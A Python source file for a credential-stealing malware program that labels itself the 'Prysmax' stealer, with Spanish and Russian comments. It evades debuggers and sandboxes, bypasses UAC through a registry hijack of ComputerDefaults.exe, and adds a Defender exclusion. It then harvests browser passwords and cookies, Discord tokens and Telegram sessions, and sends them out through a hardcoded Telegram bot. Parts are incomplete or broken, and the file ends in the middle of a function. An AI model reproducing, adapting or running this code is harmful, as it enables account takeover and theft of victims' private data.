import os
import sys
import re
import json
import time
import random
import base64
import shutil
import sqlite3
import zipfile
import platform
import subprocess
import threading
import requests
import websocket
import ctypes
import win32com.client


from zipfile import ZipFile
from base64 import b64decode
from json import loads
from win32com.client import Dispatch
from Crypto.Cipher import AES
from ctypes import windll, wintypes, byref, Structure, POINTER, c_char, c_buffer
import requests

def obtener_elcdos():
    try:
        response = requests.get('https://raw.githubusercontent.com/Lawxsz/web-scanner/main/ad')
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e:
        print(f'Ошибка при получении домена: {e}')
        return None
DOMAIN = obtener_elcdos()

def reportar_error(error, funcion):
    try:
        bot_token = '7561559918:AAEQC9RDUFYmca2O8Ql32B5KE4gKc1qpVrE'
        chat_id = '1665274281'
        message = f"Ошибка в функции {funcion}\nПользователь: {username}\nОшибка: {str(error)}"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message}
        requests.post(url, data=data)
    except Exception as api_error:
        print(f'[ОШИБКА] Не удалось отправить сообщение об ошибке в телеграм: {api_error}')

def obtener_gpu():
    try:
        out = subprocess.check_output(['wmic', '/locale:ms_409', 'path', 'win32_videocontroller', 'get', 'caption'], shell=True)
        try:
            txt = out.decode('utf-8')
        except UnicodeDecodeError:
            txt = out.decode('latin1', errors='replace')
        lines = [l.strip() for l in txt.splitlines() if l.strip()]
        for line in lines[1:]:
            if 'NVIDIA' in line.upper() or 'AMD' in line.upper():
                return line
    except Exception as e:
        reportar_error(e, 'obtener_gpu')
    return 'Unknown'
gpu = obtener_gpu()

def fetch_blacklist_files_v2(base_url: str, files: list) -> dict:
    blacklists = {}
    for file_name in files:
        try:
            url = f'{base_url}/{file_name}'
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                blacklists[file_name] = response.text.splitlines()
            else:
                print(f'Не удалось получить {file_name}: HTTP {response.status_code}')
        except requests.RequestException as e:
            print(f'Ошибка при получении {file_name}: {e}')
    return blacklists

version_os = sys.getwindowsversion()
os_version = f'Windows {version_os.major}.{version_os.minor}.{version_os.build} - {version_os.service_pack}'

def get_system_info() -> dict:
    try:
        hwid = subprocess.getoutput('wmic csproduct get uuid').split('\n')[1].strip()
        mac = subprocess.getoutput('getmac').split('\n')[0].strip()
        ipconfig_output = subprocess.getoutput('ipconfig')
        ips = re.findall('IPv4 Address.*?: (\\d+\\.\\d+\\.\\d+\\.\\d+)', ipconfig_output)
        pc_name = os.environ.get('COMPUTERNAME', '').strip()
        tasklist_output = subprocess.getoutput('tasklist').lower()
        processes = [line.split()[0] for line in tasklist_output.split('\n')[3:] if line]
        version_os = os.sys.getwindowsversion()
        os_version = f'Windows {version_os.major}.{version_os.minor}.{version_os.build} - {version_os.service_pack}'
        services_output = subprocess.getoutput('sc query').lower()
        services = re.findall('service_name: (\\S+)', services_output)
        return {'gpu': gpu, 'hwid': hwid, 'mac': mac, 'ips': ips, 'pc_name': pc_name, 'processes': processes, 'os_version': os_version, 'services': services}
    except Exception as e:
        print(f'Ошибка при получении информации о системе: {e}')
        reportar_error(e, 'get_system_info')
        return {}

def debug_presente():
    try:
        kernel32 = ctypes.windll.kernel32
        if kernel32.IsDebuggerPresent():
            os._exit(1)
    except Exception as e:
        reportar_error(e, 'Is Debugger')


def es_triag3():
    SPI_GETDESKWALLPAPER = 115
    MAX_PATH = 260
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    buffer_wallpaper = ctypes.create_unicode_buffer(MAX_PATH)
    result = user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, buffer_wallpaper, 0)
    if result == 0:
        print('Не удалось получить путь к обоям (SystemParametersInfoW).')
        return False
    wallpaper_path = buffer_wallpaper.value.strip()
    try:
        if not wallpaper_path or not os.path.exists(wallpaper_path):
            return False
        file_size = os.path.getsize(wallpaper_path)
        if file_size == 24811:
            print('Обнаружен подозрительный фон рабочего стола (Triage)!')
            return True
    except Exception as e:
        reportar_error(e, 'es_triag3')
    return False

def is_screen_small():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    SM_CXSCREEN = 0
    SM_CYSCREEN = 1
    width = user32.GetSystemMetrics(SM_CXSCREEN)
    height = user32.GetSystemMetrics(SM_CYSCREEN)
    if width < 800 or height < 600:
        print(f'Resolución detectada muy pequeña: {width}x{height}')
        return True
    return False

def is_hosted():
    try:
        resp = requests.get('http://ip-api.com/line/?fields=hosting', timeout=10)
        if resp.status_code == 200:
            return "hosting" in resp.text
        return False
    except Exception as e:
        reportar_error(e, 'is_hosted')
        return False

def obtener_ruta_ejecutable():
    buffer = ctypes.create_unicode_buffer(260)
    ctypes.windll.kernel32.GetModuleFileNameW(None, buffer, 260)
    return buffer.value

def modificar_registro(ruta_objetivo):
    try:
        reg_path = 'Software\\Classes\\ms-settings\\Shell\\open\\command'
        key = 'HKEY_CURRENT_USER'
        shell = Dispatch('WScript.Shell')
        shell.RegWrite(f'{key}\\{reg_path}\\', ruta_objetivo, 'REG_SZ')
        shell.RegWrite(f'{key}\\{reg_path}\\DelegateExecute', '', 'REG_SZ')
        print('[+] Registro modificado exitosamente.')
    except Exception as e:
        print(f'[-] Error al modificar el registro: {e}')

def ejecutar_bipssas():
    try:
        print('[+] Ejecutando ComputerDefaults.exe...')
        subprocess.Popen('ComputerDefaults.exe', shell=True)
        print('[+] Ejecución iniciada.')
    except Exception as e:
        print(f'[-] Error al ejecutar ComputerDefaults.exe: {e}')

def limpiar_registro():
    try:
        reg_path = 'Software\\Classes\\ms-settings\\Shell\\open\\command'
        key = 'HKEY_CURRENT_USER'
        shell = Dispatch('WScript.Shell')
        shell.RegDelete(f'{key}\\{reg_path}\\DelegateExecute')
        shell.RegDelete(f'{key}\\{reg_path}\\')
        print('[+] Registro limpiado.')
    except Exception as e:
        print(f'[-] Error al limpiar el registro: {e}')

def verificar_proceso_elevado():
    indicador = os.path.join(os.path.expanduser('~'), 'xx.flag')
    for _ in range(5):
        if os.path.exists(indicador):
            print('[+] Proceso elevado detectado.')
            return True
        time.sleep(1)
    print('[-] No se detectó el proceso elevado.')
    return False

def cerrar_proceso_actual():
    try:
        print('[+] Cerrando el proceso original.')
        os._exit(0)
    except Exception as e:
        print(f'[-] Error al cerrar el proceso: {e}')
try:
    limpiar_registro()
    ruta_objetivo = obtener_ruta_ejecutable()
    print(f'[+] Ruta del ejecutable actual: {ruta_objetivo}')
    if ctypes.windll.shell32.IsUserAnAdmin():
        with open(os.path.join(os.path.expanduser('~'), 'xx.flag'), 'w') as f:
            f.write('Elevado correctamente.')
        print('[+] Este proceso se ejecuta con privilegios elevados.')
        flag_path = os.path.join(os.path.expanduser('~'), 'xx.flag')
    else:
        print('[+] Este proceso no se ejecuta con privilegios elevados.')
        print('[+] Iniciando el bypass de UAC...')
        modificar_registro(ruta_objetivo)
        ejecutar_bipssas()
        time.sleep(2)
        if verificar_proceso_elevado():
            limpiar_registro()
            cerrar_proceso_actual()
        else:
            limpiar_registro()
            print('[-] No se detectó el proceso elevado. Continuando sin cerrar el proceso original.')
except Exception as e:
    print('Error en jefe: ', e)
pc_name = os.getenv('COMPUTERNAME')
current_time = time.strftime('%H-%M-%S')
desktop_name = os.environ['COMPUTERNAME']
REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
username = 'adrikadi'
DIR_LOCAL = os.getenv('localappdata')
DIR_APP = os.getenv('appdata')
DIR_PROGRAM = os.getenv('programfiles')
DIR_PROGRAM_X86 = os.getenv('programfiles(x86)')
passwords_count = 0
credit_cards_count = 0
extracted_games = []
threads_windows = []
CMD = 'C:\\Windows\\System32\\cmd.exe'

class SECItem(ctypes.Structure):
    _fields_ = [('type', ctypes.c_uint), ('data', ctypes.POINTER(ctypes.c_ubyte)), ('len', ctypes.c_uint)]
BROWSER_SETTINGS = {
    'chrome': {
        'path_exe': f'{DIR_PROGRAM}\\Google\\Chrome\\Application\\chrome.exe',
        'path_data': f'{DIR_LOCAL}\\Google\\Chrome\\User Data'
    },
    'edge': {
        'path_exe': f'{DIR_PROGRAM_X86}\\Microsoft\\Edge\\Application\\msedge.exe',
        'path_data': f'{DIR_LOCAL}\\Microsoft\\Edge\\User Data'
    },
    'opera': {
        'path_exe': f'{DIR_LOCAL}\\Programs\\Opera\\opera.exe',
        'path_data': f'{DIR_APP}\\Opera Software\\Opera Stable'
    },
    'opera_gx': {
        'path_exe': f'{DIR_PROGRAM}\\Opera GX\\launcher.exe',
        'path_data': f'{DIR_LOCAL}\\Opera Software\\Opera GX Stable'
    },
    'brave': {
        'path_exe': f'{DIR_PROGRAM}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
        'path_data': f'{DIR_LOCAL}\\BraveSoftware\\Brave-Browser\\User Data'
    },
    'vivaldi': {
        'path_exe': f'{DIR_PROGRAM}\\Vivaldi\\Application\\vivaldi.exe',
        'path_data': f'{DIR_LOCAL}\\Vivaldi\\User Data'
    },
    'tor': {
        'path_exe': f'{DIR_PROGRAM}\\Tor Browser\\Browser\\firefox.exe',
        'path_data': f'{DIR_LOCAL}\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default'
    },
    'chromium': {
        'path_exe': f'{DIR_PROGRAM}\\Chromium\\Application\\chrome.exe',
        'path_data': f'{DIR_LOCAL}\\Chromium\\User Data'
    },
    'yandex': {
        'path_exe': f'{DIR_PROGRAM}\\Yandex\\YandexBrowser\\Application\\browser.exe',
        'path_data': f'{DIR_LOCAL}\\Yandex\\YandexBrowser\\User Data'
    },
    'maxthon': {
        'path_exe': f'{DIR_PROGRAM}\\Maxthon\\Bin\\Maxthon.exe',
        'path_data': f'{DIR_LOCAL}\\Maxthon5\\User Data'
    },
    'ucbrowser': {
        'path_exe': f'{DIR_PROGRAM}\\UCBrowser\\Application\\UCBrowser.exe',
        'path_data': f'{DIR_LOCAL}\\UCBrowser\\User Data'
    },
    'comodo_dragon': {
        'path_exe': f'{DIR_PROGRAM}\\Comodo\\Dragon\\dragon.exe',
        'path_data': f'{DIR_LOCAL}\\Comodo\\Dragon\\User Data'
    },
    'avast_secure_browser': {
        'path_exe': f'{DIR_PROGRAM}\\AVAST Software\\Browser\\Application\\AvastBrowser.exe',
        'path_data': f'{DIR_LOCAL}\\AVAST Software\\Browser\\User Data'
    },
    '360_browser': {
        'path_exe': f'{DIR_PROGRAM}\\360Browser\\360Browser.exe',
        'path_data': f'{DIR_LOCAL}\\360Browser\\User Data'
    },
    'slimjet': {
        'path_exe': f'{DIR_PROGRAM}\\Slimjet\\slimjet.exe',
        'path_data': f'{DIR_LOCAL}\\Slimjet\\User Data'
    },
    'waterfox': {
        'path_exe': f'{DIR_PROGRAM}\\Waterfox\\waterfox.exe',
        'path_data': f'{DIR_LOCAL}\\Waterfox\\Profiles'
    }
}

def detectar_perfiles(dir_usuario):
    perfiles = []
    try:
        if os.path.exists(dir_usuario):
            for item in os.listdir(dir_usuario):
                if os.path.isdir(os.path.join(dir_usuario, item)) and item.startswith('Profile'):
                    perfiles.append(item)
            if os.path.exists(os.path.join(dir_usuario, 'Default')):
                perfiles.insert(0, 'Default')
    except Exception as ex:
        reportar_error(e, 'Detectar Perfiles')
        print(f'Error al detectar perfiles en {dir_usuario}: {ex}')
    return perfiles

def ocultarlaven():
    print('asduhasduh')
ocultarlaven()

def run_powershell_command(command):
    try:
        completed_process = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        if completed_process.returncode != 0:
            raise Exception(f"Command failed: {completed_process.stderr}")
        return completed_process.stdout
    except Exception as e:
        reportar_error(e, 'run_powershell_command')
        print(f'Error executing PowerShell command: {e}')

def file_retriever():
    # Dummy implementation for the sake of example
    return 5

def excluirtem():
    try:
        temp_folder = os.getenv('TEMP')
        run_powershell_command(f"Add-MpPreference -ExclusionPath '{temp_folder}'")
    except Exception as e:
        reportar_error(f'Error creando el archivo ZIP: {str(e)}', 'Error en file retriever')
        print(f'Error al crear el archivo ZIP: {e}')
    return file_count

try:
    file_count = file_retriever()
    if file_count > 0:
        zip_path = os.path.join(os.getenv('TEMP'), 'FileRetriever_Prysmax.zip')
        with open(zip_path, 'rb') as file_obj:
            telegram_bot_token = '7561559918:AAEQC9RDUFYmca2O8Ql32B5KE4gKc1qpVrE'
            chat_id = '1665274281'
            telegram_url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
            data = {'chat_id': chat_id, 'caption': f'Username: {username}, Time: {current_time}, Files Stolen: {file_count}'}
            files = {'document': (os.path.basename(zip_path), file_obj, 'application/zip')}
            response = requests.post(telegram_url, data=data, files=files)
        try:
            os.remove(zip_path)
        except Exception as e:
            reportar_error(e, 'Error en File Retriever')
        if response.status_code == 200:
            print('Archivo enviado exitosamente al Telegram Bot.')
        else:
            print(f'Error al enviar archivo a Telegram: {response.status_code} - {response.text}')
except Exception as e:
    reportar_error(e, 'Error en File Retriever')
    print(f'Error enviando archivos extraidos: {e}')

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ('biSize', wintypes.DWORD),
        ('biWidth', wintypes.LONG),
        ('biHeight', wintypes.LONG),
        ('biPlanes', wintypes.WORD),
        ('biBitCount', wintypes.WORD),
        ('biCompression', wintypes.DWORD),
        ('biSizeImage', wintypes.DWORD),
        ('biXPelsPerMeter', wintypes.LONG),
        ('biYPelsPerMeter', wintypes.LONG),
        ('biClrUsed', wintypes.DWORD),
        ('biClrImportant', wintypes.DWORD)
    ]

def obtenerpantallita_dc():
    user32 = ctypes.windll.user32
    user32.GetDC.restype = ctypes.c_void_p
    screen_dc = user32.GetDC(0)
    return screen_dc

def mostrar_pantallita(dc):
    user32 = ctypes.windll.user32
    user32.ReleaseDC(0, dc)

def capture_screen():
    try:
        screen_dc = obtenerpantallita_dc()
        user32 = ctypes.windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        gdi32 = ctypes.windll.gdi32
        hdc_mem = gdi32.CreateCompatibleDC(screen_dc)
        hbitmap = gdi32.CreateCompatibleBitmap(screen_dc, screen_width, screen_height)
        gdi32.SelectObject(hdc_mem, hbitmap)
        gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, screen_dc, 0, 0, 13369376)
        bmp_info_header = BITMAPINFOHEADER()
        bmp_info_header.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmp_info_header.biWidth = screen_width
        bmp_info_header.biHeight = screen_height
        bmp_info_header.biPlanes = 1
        bmp_info_header.biBitCount = 24
        bmp_info_header.biCompression = 0
        bmp_info_header.biSizeImage = screen_width * screen_height * 3
        bmp_info_header.biXPelsPerMeter = 0
        bmp_info_header.biYPelsPerMeter = 0
        bmp_info_header.biClrUsed = 0
        bmp_info_header.biClrImportant = 0
        file_path = os.path.join(os.getenv('TEMP'), f'prysmax_{current_time}', 'screenshot.bmp')
        os.makedirs(os.path.join(os.getenv('TEMP'), f'prysmax_{current_time}'), exist_ok=True)
        with open(file_path, 'wb') as bmp_file:
            bmp_file.write(b'BM')
            bmp_file.write(ctypes.c_uint32(54 + bmp_info_header.biSizeImage).value.to_bytes(4, byteorder='little'))
            bmp_file.write(ctypes.c_uint32(0).value.to_bytes(4, byteorder='little'))
            bmp_file.write(ctypes.c_uint32(54).value.to_bytes(4, byteorder='little'))
            bmp_file.write(bytes(bmp_info_header))
            bmp_data = ctypes.create_string_buffer(bmp_info_header.biSizeImage)
            gdi32.GetDIBits(screen_dc, hbitmap, 0, screen_height, bmp_data, ctypes.byref(bmp_info_header), 0)
            bmp_file.write(bmp_data.raw)
        print(f'Captura de pantalla guardada en: {file_path}')
        mostrar_pantallita(screen_dc)
        gdi32.DeleteObject(hbitmap)
        gdi32.DeleteDC(hdc_mem)
    except Exception as e:
        reportar_error(e, 'Error capturando la pantalla del PC')
MAX_RETRIES = 2
global cookies_count
cookies_count = 0
cookies_dir = os.path.join(os.getenv('TEMP'), f'prysmax_{current_time}_cookies')
os.makedirs(cookies_dir, exist_ok=True)
try:
    procesos_corriendosejaj_bytes = subprocess.check_output('chcp 65001 > nul && tasklist', shell=True)
    procesos_corriendosejaj = procesos_corriendosejaj_bytes.decode('utf-8', errors='replace')
except Exception as e:
    print(f'Error capturing tasklist: {e}')
    reportar_error(e, 'Error Capturando tasklist procesos_corriendosejaj')
    procesos_corriendosejaj = None

def agarraryenviareldisc():
    tokens = []

    def checkToken(token, app_name):
        if token:
            tokens.append(f'{token} | {app_name}')

    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception as e:
            reportar_error(e, 'agarraryenviareldisc')
            return None

    def get_master_key(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            crypt32 = ctypes.windll.crypt32
            kernel32 = ctypes.windll.kernel32

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

            def get_data(blob_out):
                cb_data = int(blob_out.cbData)
                pb_data = blob_out.pbData
                buffer = ctypes.create_string_buffer(cb_data)
                ctypes.memmove(buffer, pb_data, cb_data)
                kernel32.LocalFree(pb_data)
                return buffer.raw

            blob_in = DATA_BLOB(len(encrypted_key), ctypes.cast(ctypes.create_string_buffer(encrypted_key), ctypes.POINTER(ctypes.c_byte)))
            blob_out = DATA_BLOB()
            if not crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                raise ValueError('Failed to decrypt master key')
            return get_data(blob_out)
        except Exception as e:
            print(f'Error obteniendo master key: {e}')
            reportar_error(e, 'Error obteniendo master key de Discord')
            return None

    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')
    paths = {
        'Discord': os.path.join(appdata, 'discord', 'Local Storage', 'leveldb'),
        'Discord Canary': os.path.join(appdata, 'discordcanary', 'Local Storage', 'leveldb'),
        'Discord PTB': os.path.join(appdata, 'discordptb', 'Local Storage', 'leveldb'),
        'Discord Development': os.path.join(appdata, 'discorddevelopment', 'Local Storage', 'leveldb'),
        'Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Edge': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        'Opera': os.path.join(appdata, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
        'Vivaldi': os.path.join(localappdata, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb')
    }
    regex = r'mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
    encrypted_regex = r'dQw4w9WgXcQ:[^.*\[\'(.*)\'\].*$][^"]*'
    for (app_name, path) in paths.items():
        try:
            if not os.path.exists(path):
                continue
            local_state_path = os.path.join(
                localappdata if app_name.lower() not in ['discord', 'opera'] else appdata,
                f"{app_name.replace(' ', '')}\\Local State"
            )
            master_key = get_master_key(local_state_path) if os.path.exists(local_state_path) else None
            for file_name in os.listdir(path):
                if not file_name.endswith(('.log', '.ldb')):
                    continue
                with open(os.path.join(path, file_name), 'r', encoding='utf-8', errors='ignore') as file:
                    for line in file:
                        for token in re.findall(regex, line):
                            checkToken(token, app_name)
                        for enc_token in re.findall(encrypted_regex, line):
                            if master_key:
                                decrypted_token = decrypt_val(base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1]), master_key)
                                if decrypted_token:
                                    checkToken(decrypted_token, app_name)
        except Exception as e:
            print(f'Error procesando {app_name}: {e}')
            reportar_error(e, f'Procesando {app_name} discord stealer')
    if tokens:
        file_path = os.path.join(os.getenv('TEMP'), 'tokens.txt')
        with open(file_path, 'w') as f:
            f.write('\n'.join(tokens))
        print(f'Tokens guardados en {file_path}')
    else:
        print('No se encontraron tokens.')

    # Envío a Telegram Bot
    bot_token = '7561559918:AAEQC9RDUFYmca2O8Ql32B5KE4gKc1qpVrE'
    chat_id = '1665274281'
    telegram_url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    data = {'chat_id': chat_id, 'caption': f"Discord Tokens\nUsername: {username}\nTime: {current_time}"}
    max_attempts = 2
    attempt = 0
    while attempt < max_attempts:
        try:
            with open(file_path, 'rb') as file:
                files = {'document': (os.path.basename(file_path), file, 'text/plain')}
                response = requests.post(telegram_url, data=data, files=files)
                if response.status_code == 200:
                    print('Tokens enviados exitosamente al Telegram Bot.')
                    try:
                        os.remove(file_path)
                    except Exception as e:
                        print(f'Error al eliminar el archivo: {e}')
                        reportar_error(e, 'DC tokens eliminar archivos')
                    break
                else:
                    raise Exception(f'Error en la respuesta del servidor. Código de estado: {response.status_code}')
        except Exception as e:
            reportar_error(e, 'Dc tokens enviar tokens por Telegram')
            attempt += 1
            if attempt < max_attempts:
                print(f'Intento {attempt} fallido. Reintentando en 3 segundos...')
                time.sleep(3)
            else:
                print(f'Error después de {max_attempts} intentos: {e}')

def init_nss(profile_path):
    nss3 = ctypes.WinDLL('C:\\Program Files\\Mozilla Firefox\\nss3.dll')
    NSS_Init = nss3.NSS_Init
    profile_path_encoded = profile_path.encode('utf-8')
    result = NSS_Init(profile_path_encoded)
    if result != 0:
        raise Exception(f'NSS_Init failed with error code: {result}')

def find_fir_pr():
    base_path = os.path.expandvars('%APPDATA%\\Mozilla\\Firefox\\Profiles')
    if not os.path.exists(base_path):
        raise Exception(f'Firefox Profiles directory does not exist: {base_path}')
    for folder in os.listdir(base_path):
        if folder.endswith('.default-release') and os.path.isdir(os.path.join(base_path, folder)):
            return os.path.join(base_path, folder)
    raise Exception("No Firefox profile ending with 'default-release' found.")

def decode_base64(encoded_string):
    try:
        return base64.b64decode(encoded_string)
    except Exception as e:
        raise Exception(f'Failed to decode Base64: {e}')

def decrypt_f(encrypted):
    encrypted_bytes = decode_base64(encrypted)
    enc_item = SECItem()
    enc_item.data = (ctypes.c_ubyte * len(encrypted_bytes)).from_buffer_copy(encrypted_bytes)
    enc_item.len = len(encrypted_bytes)
    dec_item = SECItem()
    PK11SDR_Decrypt = ctypes.WinDLL('C:\\Program Files\\Mozilla Firefox\\nss3.dll').PK11SDR_Decrypt
    result = PK11SDR_Decrypt(ctypes.byref(enc_item), ctypes.byref(dec_item), None)
    if result != 0:
        raise Exception(f'PK11SDR_Decrypt failed with error code: {result}')
    decrypted_bytes = ctypes.string_at(dec_item.data, dec_item.len)
    return decrypted_bytes.decode('utf-8')

def firefox_c(profile_path, output_dir):
    cookies_path = os.path.join(profile_path, 'cookies.sqlite')
    if not os.path.exists(cookies_path):
        raise Exception('cookies.sqlite not found in profile')
    cookies_file_path = os.path.join(output_dir, 'Prysmax_Firefox_Cookies.txt')
    conn = sqlite3.connect(cookies_path)
    cursor = conn.cursor()
    global cookies_count
    try:
        cursor.execute('SELECT host, name, value, path, expiry, isSecure FROM moz_cookies')
        cookies = cursor.fetchall()
        with open(cookies_file_path, 'w', encoding='utf-8') as file:
            file.write('# Prysmax.xyz Stealer Cookies File\n')
            for (host, name, value, path, expiry, is_secure) in cookies:
                secure_flag = 'TRUE' if is_secure else 'FALSE'
                file.write(f'{host}\t{secure_flag}\t{path}\t{secure_flag}\t{expiry}\t{name}\t{value}\n')
        print(f'Cookies saved to: {cookies_file_path}')
        cookies_count += len(cookies)
    except sqlite3.DatabaseError as e:
        raise Exception(f'Failed to read cookies from cookies.sqlite: {e}')
    finally:
        cursor.close()
        conn.close()

def firefox_p(profile_path, output_dir):
    logins_json_path = os.path.join(profile_path, 'logins.json')
    if not os.path.exists(logins_json_path):
        raise Exception('logins.json not found in profile')
    passwords_file_path = os.path.join(output_dir, 'Prysmax_Firefox_Passwords.txt')
    with open(logins_json_path, 'r', encoding='utf-8') as file:
        logins_data = json.load(file)
    global passwords_count
    with open(passwords_file_path, 'w', encoding='utf-8') as file:
        for login in logins_data.get('logins', []):
            try:
                username = decrypt_f(login['encryptedUsername'])
                password = decrypt_f(login['encryptedPassword'])
                file.write(f"============== \nPrysmax.xyz Stealer <3\nHostname: {login['hostname']}\nUsername: {username}\nPassword: {password}\n==============\n\n")
                passwords_count += 1
            except Exception as e:
                file.write(f"Error decrypting credentials for {login['hostname']}: {e}\n\n")
    print(f'Passwords saved to: {passwords_file_path}')
    print(f'Total passwords extracted: {passwords_count}')

def devolver_a_Telegram():
    try:
        user = os.path.expanduser('~')
        prysmax_tele = 'prysmax_telegram'
        possible_paths = [
            os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
            os.path.join(user, 'AppData', 'Local', 'Telegram Desktop', 'tdata'),
            os.path.join(user, 'Program Files', 'Telegram Desktop', 'tdata'),
            os.path.join(user, 'Program Files (x86)', 'Telegram Desktop', 'tdata')
        ]
        zip_dest_dir = os.path.join(user, 'AppData', 'Roaming', 'Telegram Desktop', prysmax_tele + '.zip')
        temp_dir = os.path.join(user, 'AppData', 'Local', 'Temp', f'prysmax-session')
        temp_dest_dir = os.path.join(temp_dir, prysmax_tele + '.zip')
        os.makedirs(temp_dir, exist_ok=True)
        if os.path.exists(temp_dir):
            try:
                os.remove(temp_dir)
                os.remove(temp_dest_dir)
            except:
                pass
        tdata_dir = None
        for path in possible_paths:
            if os.path.exists(path):
                tdata_dir = path
                break

        # Если не найден tdata, отправляем базовую информацию на указанный URL
        ip_info = get_ip_info(get_public_ip())
        if not tdata_dir:
            data = {
                'telegram_username': username.lower(),
                'pc_name': pc_name,
                'desktop_name': desktop_name,
                'windows_version': os_version,
                'extracted_games': json.dumps(extracted_games),
                'file_stolen': file_count,
                'antivirus_names': antivirus_names,
                'gpu_info': gpu,
                'ip_address': get_ip_address(),
                'mac_address': get_mac_address(),
                'ram': get_ram(),
                'public_ip': get_public_ip(),
                'current_time': current_time,
                'cookies_count': cookies_count,
                'telegram_exists': verificar_telegram(),
                'country': ip_info.get('country', 'N/A'),
                'region': ip_info.get('region', 'N/A'),
                'city': ip_info.get('city', 'N/A'),
                'company_name': ip_info.get('company_name', 'N/A'),
                'country_code': ip_info.get('country_code', 'Unknown')
            }
            print("Не найден каталог 'tdata' в общих путях.")
            max_attempts = 2
            attempt = 0
            url = "http://example.com/api"  # Замените на нужный URL
            while attempt < max_attempts:
                try:
                    response = requests.post(url, json=data, timeout=10)
                    if response.ok:
                        print("Запрос выполнен успешно!")
                        break
                    else:
                        print(f"Ошибка запроса: статус {response.status_code}, ответ: {response.text}")
                except requests.RequestException as e:
                    print(f"Произошла ошибка при выполнении запроса: {e}")
                attempt += 1
            return

        # Если найден tdata, продолжаем сбор и отправку данных
        prysmax_tele_dir = os.path.join(tdata_dir, prysmax_tele)
        connection_hash_dir = os.path.join(tdata_dir, 'connection_hash')
        map_dir = os.path.join(tdata_dir, 'map')
        os.makedirs(connection_hash_dir, exist_ok=True)
        os.makedirs(map_dir, exist_ok=True)
        blacklist_files = ['emoji', 'user_data', 'user_data#2', 'user_data#3', 'user_data#4', 'user_data#5']
        try:
            process_name = 'Telegram.exe'
            try:
                print(f'Cerrando el proceso: {process_name}')
                subprocess.run(f'taskkill /F /IM {process_name}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=134217728, start_new_session=True)
                print(f'Proceso {process_name} cerrado.')
                time.sleep(1)
            except:
                pass
            else:
                print(f'El proceso {process_name} не se encuentra en ejecución.')

            def copy_files(src_dir, dest_dir):
                for item in os.listdir(src_dir):
                    item_path = os.path.join(src_dir, item)
                    if item in blacklist_files:
                        continue
                    dest_item_path = os.path.join(dest_dir, item)
                    if os.path.isdir(item_path):
                        os.makedirs(dest_item_path, exist_ok=True)
                        copy_files(item_path, dest_item_path)
                    elif os.path.isfile(item_path):
                        shutil.copy2(item_path, dest_item_path)
            copy_files(tdata_dir, temp_dir)
            if not os.listdir(temp_dir):
                print('No hay archivos para comprimir en el directorio temporal.')
                return
            try:
                with ZipFile(zip_dest_dir, 'w') as zipObj:
                    for (folderName, subfolders, filenames) in os.walk(temp_dir):
                        for filename in filenames:
                            filePath = os.path.join(folderName, filename)
                            try:
                                zipObj.write(filePath, os.path.relpath(filePath, temp_dir))
                            except UnicodeEncodeError:
                                print(f'Error al agregar {filePath} al ZIP')
            except Exception as th:
                reportar_error(th, 'Error en Telegram Retriever ZIP')
            print(f'Archivo ZIP creado en: {zip_dest_dir}')
            try:
                os.makedirs(temp_dir, exist_ok=True)
                shutil.copy(zip_dest_dir, temp_dest_dir)
            except:
                pass

            # Отправка файла в Telegram Bot
            telegram_bot_token = '7561559918:AAEQC9RDUFYmca2O8Ql32B5KE4gKc1qpVrE'
            chat_id = '1665274281'
            telegram_url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
            max_attempts = 2
            attempt = 0
            while attempt < max_attempts:
                try:
                    with open(zip_dest_dir, 'rb') as f:
                        files = {'document': (os.path.basename(zip_dest_dir), f, 'application/zip')}
                        data = {
                            'chat_id': chat_id,
                            'caption': f"Usuario: {username}, PC: {pc_name}, Tiempo: {current_time}, Cookies: {cookies_count}"
                        }
                        response = requests.post(telegram_url, files=files, data=data, timeout=10)
                        if response.ok:
                            print('Archivo ZIP enviado exitosamente al Telegram Bot.')
                            break
                        else:
                            print(f"Error al enviar a Telegram: {response.status_code} {response.text}")
                except requests.RequestException as e:
                    print(f"Intento {attempt+1} fallido. Error: {e}")
                attempt += 1

            try:
                os.remove(zip_dest_dir)
            except Exception as e:
                print(e)
